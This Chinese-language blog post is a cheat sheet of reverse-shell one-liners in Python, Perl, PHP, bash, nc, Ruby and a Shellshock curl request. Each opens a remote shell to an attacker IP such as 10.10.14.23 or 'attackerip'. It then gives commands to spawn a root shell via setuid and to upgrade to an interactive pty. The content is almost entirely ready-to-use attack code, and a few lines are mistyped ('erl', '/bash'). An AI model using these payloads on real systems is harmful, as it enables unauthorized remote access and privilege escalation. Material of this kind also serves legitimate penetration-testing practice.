---
title: 对shell的各种处理
date: 2022-10-12 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/gz_13.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: shell
tags: shell   # 可以是数组
top: false
---



# 对shell的各种处理





## 一、反弹shell的各种姿势

- python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- perl

```perl
erl -e 'use Socket;$i="10.10.14.23";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- php

```php
<?php system('nc -e /bin/bash 192.168.1.8 4444')?>  //html版
    
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'    //内置语言版
```

- curl

```
`curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.23/4443 0>&1' http://10.10.10.56/cgi-bin/user.sh`
```

- bash

```
/bash -i >& /dev/tcp/10.10.14.23/4444 0>&1
```

- nc

```
nc -e /bin/sh 10.0.0.1 1234
```

- Ruby

```R
//依赖/bin/sh:
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

//不依赖：
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```





## 二、调取shell的各种方式

- perl

```perl
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

- python （获取交互式shell）

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

